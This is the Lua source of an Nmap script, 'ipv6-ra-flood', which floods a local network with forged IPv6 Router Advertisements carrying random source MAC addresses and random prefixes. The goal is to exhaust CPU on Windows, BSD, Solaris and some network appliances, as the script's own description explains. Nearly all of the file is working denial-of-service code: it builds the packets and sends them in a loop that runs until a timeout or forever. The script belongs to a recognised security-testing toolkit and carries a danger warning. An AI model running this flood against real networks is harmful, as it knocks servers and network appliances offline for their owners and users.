local ipOps = require "ipOps"
local nmap = require "nmap"
local packet = require "packet"
local stdnse = require "stdnse"
local math = require "math"
local string = require "string"
local os = require "os"

description = [[
Generates a flood of Router Advertisements (RA) with random source MAC
addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration
enabled by default (every major OS), will start to compute IPv6 suffix and
update their routing table to reflect the accepted announcement. This will
cause 100% CPU usage on Windows and platforms, preventing to process other
application requests.

Vulnerable platforms:
* All Cisco IOS ASA with firmware < November 2010
* All Netscreen versions supporting IPv6
* Windows 2000/XP/2003/Vista/7/2008/8/2012
* All FreeBSD versions
* All NetBSD versions
* All Solaris/Illumos versions

Security advisory: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt

WARNING: This script is dangerous and is very likely to bring down a server or
network appliance.  It should not be run in a production environment unless you
(and, more importantly, the business) understand the risks!

Additional documents: https://tools.ietf.org/rfc/rfc6104.txt
]]

---
-- @args ipv6-ra-flood.interface defines interface we should broadcast on
-- @args ipv6-ra-flood.timeout runs the script until the timeout is reached
--       (default: 30s). If timeout is zero, the script will run forever.
--
-- @usage
-- nmap -6 --script ipv6-ra-flood.nse
-- nmap -6 --script ipv6-ra-flood.nse --script-args 'interface=<interface>'
-- nmap -6 --script ipv6-ra-flood.nse --script-args 'interface=<interface>,timeout=10s'

author = "Adam Števko"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}

try = nmap.new_try()

math.randomseed(os.time())

prerule = function()
  if nmap.address_family() ~= "inet6" then
    stdnse.debug1("is IPv6 compatible only.")
    return false
  end

  if not nmap.is_privileged() then
    stdnse.debug1("Running %s needs root privileges.", SCRIPT_NAME)
    return false
  end

  if not stdnse.get_script_args(SCRIPT_NAME .. ".interface") and not nmap.get_interface() then
    stdnse.debug1("No interface was selected, aborting...")
    return false
  end

  return true
end

local function get_interface()
  local arg_interface = stdnse.get_script_args(SCRIPT_NAME .. ".interface") or nmap.get_interface()

  local if_table = nmap.get_interface_info(arg_interface)

  if if_table and ipOps.ip_to_str(if_table.address) and if_table.link == "ethernet" then
    return if_table.device
  else
    stdnse.debug1("Interface %s not supported or not properly configured, exiting...", arg_interface)
  end
end

--- Generates random MAC address
-- @return mac string containing random MAC address
local function random_mac()

  local mac = string.format("%02x:%02x:%02x:%02x:%02x:%02x", 00, 180, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1)
  return mac
end

--- Generates random IPv6 prefix
-- @return prefix string containing random IPv6 /64 prefix
local function get_random_prefix()
  local prefix = string.format("2a01:%02x%02x:%02x%02x:%02x%02x::", math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1)

  return prefix
end

--- Build an ICMPv6 payload of Router Advertisement.
-- @param mac_src six-byte string of the source MAC address.
-- @param prefix 16-byte string of IPv6 address.
-- @param prefix_len integer that represents the length of the prefix.
-- @param valid_time integer that represents the valid time of the prefix.
-- @param preferred_time integer that represents the preferred time of the prefix.
-- @param mtu integer that represents MTU of the link
-- @return icmpv6_payload string representing ICMPv6 RA payload

local function build_router_advert(mac_src,prefix,prefix_len,valid_time,preferred_time, mtu)
  local ra_msg = string.char(0x0, --cur hop limit
  0x08, --flags
  0x00,0x00, --router lifetime
  0x00,0x00,0x00,0x00, --reachable time
  0x00,0x00,0x00,0x00) --retrans timer

  local mtu_option_msg = "\0\0" .. -- reserved
  packet.numtostr32(mtu) -- MTU

  local prefix_option_msg = string.char(prefix_len, 0xc0) .. --flags: Onlink, Auto
  packet.set_u32("....", 0, valid_time) .. -- valid lifetime
  packet.set_u32("....", 0, preferred_time) .. -- preferred lifetime
  "\0\0\0\0" .. --unknown
  prefix

  local icmpv6_mtu_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_MTU, mtu_option_msg)
  local icmpv6_prefix_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_PREFIX_INFORMATION, prefix_option_msg)
  local icmpv6_src_link_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_SOURCE_LINKADDR, mac_src)

  local icmpv6_payload = ra_msg .. icmpv6_mtu_option .. icmpv6_prefix_option .. icmpv6_src_link_option

  return icmpv6_payload
end

--- Broadcasting on the selected interface
-- @param iface table containing interface information
local function broadcast_on_interface(iface)
  stdnse.verbose1("Starting on interface " .. iface)

  -- packet counter
  local counter = 0

  local arg_timeout = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME..".timeout"))
  arg_timeout = arg_timeout or 30

  local dnet = nmap.new_dnet()

  try(dnet:ethernet_open(iface))

  local dst_mac = packet.mactobin("33:33:00:00:00:01")
  local dst_ip6_addr = ipOps.ip_to_str("ff02::1")

  local prefix_len = 64

  --- maximum possible value of 4-byte integer
  local valid_time = tonumber(0xffffffff)
  local preferred_time = tonumber(0xffffffff)

  local mtu = 1500

  local start, stop = os.time()

  while true do

    local src_mac = packet.mactobin(random_mac())
    local src_ip6_addr = packet.mac_to_lladdr(src_mac)

    local prefix = ipOps.ip_to_str(get_random_prefix())

    local packet = packet.Frame:new()

    packet.mac_src = src_mac
    packet.mac_dst = dst_mac
    packet.ip_bin_src = src_ip6_addr
    packet.ip_bin_dst = dst_ip6_addr

    local icmpv6_payload = build_router_advert(src_mac, prefix, prefix_len, valid_time, preferred_time, mtu)
    packet:build_icmpv6_header(134, 0, icmpv6_payload)
    packet:build_ipv6_packet()
    packet:build_ether_frame()

    try(dnet:ethernet_send(packet.frame_buf))

    counter = counter + 1

    if arg_timeout and arg_timeout > 0 and arg_timeout <= os.time() - start then
      stop = os.time()
      break
    end
  end

  if counter > 0 then
    stdnse.debug1("generated %d packets in %d seconds.", counter, stop - start)
  end
end

function action()
  local interface = get_interface()

  broadcast_on_interface(interface)
end
